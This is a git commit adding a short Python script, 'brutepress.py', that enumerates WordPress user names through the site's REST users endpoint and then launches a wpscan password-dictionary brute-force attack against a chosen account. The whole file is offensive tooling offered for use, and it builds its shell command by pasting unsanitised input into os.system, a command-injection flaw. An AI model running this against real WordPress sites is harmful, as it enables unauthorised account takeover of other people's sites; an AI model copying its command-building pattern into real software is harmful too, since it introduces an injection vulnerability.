46fd9c80d6d0c95b94ff97a3fce007c54e8c4371
NullWin <44825899+NullWin@users.noreply.github.com>
2020-07-30 02:03:25 -0300

    Add files via upload

---
+++ brutepress.py
@@ -0,0 +1,34 @@
+import requests
+import os
+
+print("    __               __")                                
+print("   / /_  _______  __/ / ___  ____  ________  __________")
+print("  / __ \/ ___/ / / / __/ _ \/ __ \/ ___/ _ \/ ___/ ___/")
+print(" / /_/ / /  / /_/ / /_/  __/ /_/ / /  /  __(__  |__  )") 
+print("/_.___/_/   \__,_/\__/\___/ .___/_/   \___/____/____/")  
+print("                         /_/")    
+
+print("                           ")
+print("Brutepress v1.0 by NullWin")
+print("                           ")
+
+url = str(input("input wordpress site: "))
+joint = url + "/wp-json/wp/v2/users"
+
+two = requests.get(joint)
+length = len(two.json())
+
+
+for x in range(length):
+    data = two.json()[x]['name']
+    print(data)
+
+number = int(input('select the username:'))
+show = two.json()[number]['name']
+print(show)
+
+dictpath = str(input("input dictionary path and file: "))
+
+comando = 'wpscan --url '+url+' --passwords '+dictpath+' --usernames '+ show
+
+os.system(comando)
